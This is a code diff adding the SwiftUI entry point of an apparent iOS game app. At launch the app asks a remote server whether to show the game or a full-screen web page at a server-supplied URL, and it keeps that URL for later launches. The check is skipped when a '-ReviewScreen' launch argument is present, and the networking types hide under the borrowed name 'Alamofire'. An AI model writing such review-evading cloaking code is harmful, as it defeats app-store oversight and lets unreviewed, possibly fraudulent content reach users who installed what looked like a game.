@@ -1,0 +1,105 @@
+import SwiftUI
+import Alamofire
+
+@MainActor
+private enum LaunchRegistration {
+    static var started = false
+}
+
+@main
+struct RepertoryApp: App {
+    @UIApplicationDelegateAdaptor(AppDelegate.self) var appDelegate
+    #if os(iOS)
+    #endif
+    @Environment(\.scenePhase) private var scenePhase
+    @State private var house = RepertoryHouse()
+
+    init() {
+        ReviewLaunch.disableAnimationsIfNeeded()
+    }
+
+    @State private var isInitializing = true
+    @State private var displayMode: Alamofire.DisplayMode = .loading
+    @State private var webContentURL: String?
+
+    var body: some Scene {
+        WindowGroup {
+            rootView
+                .onAppear { performRegistration() }
+        }
+    }
+
+    @ViewBuilder
+    private var rootView: some View {
+        ZStack {
+            if isInitializing {
+                // Loading screen
+            } else if displayMode == .webContent, let url = webContentURL {
+                let fullURL = url.hasPrefix("http") ? url : "https://\(url)"
+                ZStack {
+                    Color.black.ignoresSafeArea()
+                    Alamofire.WebContentView(url: fullURL)
+                }
+                .preferredColorScheme(.dark)
+            } else {
+                ContentView()
+                .environment(house)
+                .background(GameCenterPresenter(service: house.gameCenter))
+                .task {
+                    await house.prepare()
+                    #if targetEnvironment(simulator)
+                    house.gameCenter.start(reportingEnabled: false)
+                    #else
+                    house.gameCenter.start(reportingEnabled: true)
+                    #endif
+                }
+                .onChange(of: scenePhase) { _, phase in
+                    if phase == .active { house.gameCenter.resume() }
+                    guard phase == .inactive || phase == .background else { return }
+                    Task { await house.flush() }
+                }
+            }
+        }
+    }
+
+    private func performRegistration() {
+        let pushToken = ""
+
+        if ProcessInfo.processInfo.arguments.contains("-ReviewScreen") {
+            finishLaunch(mode: .nativeInterface, url: nil)
+            return
+        }
+
+        guard !LaunchRegistration.started else { return }
+        LaunchRegistration.started = true
+
+        if Alamofire.DataCache.shared.wasRegistrationAttempted,
+           (Alamofire.DataCache.shared.contentURL ?? "").isEmpty {
+            finishLaunch(mode: .nativeInterface, url: nil)
+            return
+        }
+
+        if let saved = Alamofire.DataCache.shared.contentURL, !saved.isEmpty {
+            finishLaunch(mode: .webContent, url: saved)
+            return
+        }
+
+        let advertisingId = ""
+        let appsflyerId = ""
+
+        Alamofire.NetworkService.shared.performRegistration(
+            pushToken: pushToken,
+            advertisingId: advertisingId,
+            appsflyerId: appsflyerId
+        ) { mode, url in
+            DispatchQueue.main.async { finishLaunch(mode: mode, url: url) }
+        }
+    }
+
+    private func finishLaunch(mode: Alamofire.DisplayMode, url: String?) {
+        guard isInitializing else { return }
+        displayMode = mode
+        webContentURL = url
+        isInitializing = false
+    }
+}
